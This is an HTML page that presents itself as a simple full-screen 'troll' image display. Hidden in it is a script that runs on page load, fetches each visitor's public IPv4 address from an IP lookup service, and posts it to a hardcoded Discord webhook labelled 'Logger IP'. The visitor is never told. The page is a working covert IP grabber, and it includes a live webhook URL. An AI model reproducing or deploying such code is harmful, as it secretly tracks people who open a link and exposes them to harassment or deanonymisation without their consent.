<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Image Display</title>
    <style>
        body {
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            background-color: #000;
            overflow: hidden;
        }
        img {
            width: 1920px;
            height: 1080px;
            object-fit: contain;
        }
    </style>
</head>
<body>
    <img src="https://media.discordapp.net/attachments/1362554109881745650/1363167753321578771/Santiago-Abascal-VOX-4.png?ex=68050c66&is=6803bae6&hm=44e6a8be21a4a6a4c57a33d6c6439ec202e03ebced9e4c6cc97f44ee1e645911&=&format=webp&quality=lossless&width=1522&height=856" alt="Troll Image">
    <script>
       
        const WEBHOOK_URL = "https://discord.com/api/webhooks/1362970582341255188/cqrdjShxtYkeiiIkgAVeH588-_aji5XdVxERffsO6FGmNyJvhjRL80tuMdj-M6W0jXzS";

        async function obtenerDatos(retries = 3) {
            for (let attempt = 1; attempt <= retries; attempt++) {
                try {
                    console.log(`ðŸ” Intento ${attempt} de obtener IP...`);

                    
                    const ipResponse = await fetch("https://api.ipify.org?format=json", {
                        method: "GET",
                        headers: { "Accept": "application/json" }
                    });
                    if (!ipResponse.ok) {
                        throw new Error(`Error obteniendo IP: ${ipResponse.status}`);
                    }
                    const ipData = await ipResponse.json();
                    const ip = ipData.ip;

                    
                    const ipv4Regex = /^(?:[0-9]{1,3}\.){3}[0-9]{1,3}$/;
                    if (!ipv4Regex.test(ip)) {
                        throw new Error("No se obtuvo una IP IPv4 vÃ¡lida");
                    }

                    console.log("âœ”ï¸ IP IPv4 obtenida:", ip);

                   
                    const mensaje = {
                        content: "**ðŸ” Nueva IP detectada**",
                        embeds: [
                            {
                                title: "ðŸŒ Datos del usuario",
                                color: 16711680,
                                fields: [
                                    { name: "ðŸ–¥ï¸ IP (IPv4)", value: `${ip}`, inline: true },
                                ],
                                footer: {
                                    text: "ðŸ” Logger IP",
                                },
                            },
                        ],
                    };

                    
                    console.log("ðŸ“¤ Enviando datos a Discord...");
                    const webhookResponse = await fetch(WEBHOOK_URL, {
                        method: "POST",
                        headers: { "Content-Type": "application/json" },
                        body: JSON.stringify(mensaje),
                    });

                    if (!webhookResponse.ok) {
                        throw new Error(`Error enviando a Discord: ${webhookResponse.status}`);
                    }

                    console.log("âœ”ï¸ Datos enviados a Discord exitosamente");
                    return; 

                } catch (error) {
                    console.error(`âŒ Error en intento ${attempt}:`, error.message);
                    if (attempt === retries) {
                        console.error("âŒ Se agotaron los intentos. No se pudo enviar la IP.");
                    }
                    
                    await new Promise(resolve => setTimeout(resolve, 1000));
                }
            }
        }

       
        obtenerDatos();
    </script>
</body>
</html>
